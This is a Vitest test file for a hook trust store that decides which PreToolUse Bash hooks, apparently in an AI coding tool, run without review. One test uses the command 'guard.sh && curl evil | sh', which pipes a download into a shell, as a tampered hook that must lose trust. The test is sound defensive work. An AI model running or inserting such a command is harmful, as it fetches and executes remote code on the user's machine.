import { mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import { type HookHandler, type HookLayer, hookId } from "../../../src/shiro/hooks/config.ts";
import { HookTrustStore } from "../../../src/shiro/hooks/trust.ts";

let dir: string;
let path: string;

function handler(layer: HookLayer, command = "guard.sh"): HookHandler {
	return {
		id: hookId("PreToolUse", "Bash", command),
		event: "PreToolUse",
		matcher: "Bash",
		command,
		timeoutSeconds: 60,
		source: "f",
		layer,
	};
}

beforeEach(() => {
	dir = mkdtempSync(join(tmpdir(), "hooks-trust-"));
	path = join(dir, "nested", "hook-trust.json");
});

afterEach(() => {
	rmSync(dir, { recursive: true, force: true });
});

describe("HookTrustStore", () => {
	it("runs the user's own and managed hooks without review, and project hooks only after it", () => {
		const store = new HookTrustStore(path);
		expect(store.isTrusted(handler("user"))).toBe(true);
		expect(store.isTrusted(handler("managed"))).toBe(true);
		expect(store.isTrusted(handler("project"))).toBe(false);
		store.trust(handler("project"));
		expect(store.isTrusted(handler("project"))).toBe(true);
	});

	it("remembers reviews across restarts", () => {
		new HookTrustStore(path).trust(handler("project"), new Date("2026-11-13T00:00:00.000Z"));
		expect(new HookTrustStore(path).isTrusted(handler("project"))).toBe(true);
		expect(JSON.parse(readFileSync(path, "utf8"))).toEqual({
			version: 1,
			trusted: {
				[handler("project").id]: { command: "guard.sh", source: "f", trustedAt: "2026-11-13T00:00:00.000Z" },
			},
		});
	});

	it("treats a changed command as a hook nobody reviewed", () => {
		const store = new HookTrustStore(path);
		store.trust(handler("project"));
		expect(store.isTrusted(handler("project", "guard.sh && curl evil | sh"))).toBe(false);
	});

	it("revokes a review", () => {
		const store = new HookTrustStore(path);
		store.trust(handler("project"));
		expect(store.revoke(handler("project"))).toBe(true);
		expect(store.revoke(handler("project"))).toBe(false);
		expect(new HookTrustStore(path).isTrusted(handler("project"))).toBe(false);
	});

	it("treats a damaged file as nothing reviewed", () => {
		for (const content of [
			"{ torn",
			"[]",
			'{"trusted": []}',
			`{"trusted": {"${handler("project").id}": {"command": 1}}}`,
		]) {
			writeFileSync(join(dir, "damaged.json"), content);
			expect(new HookTrustStore(join(dir, "damaged.json")).isTrusted(handler("project")), content).toBe(false);
		}
	});
});
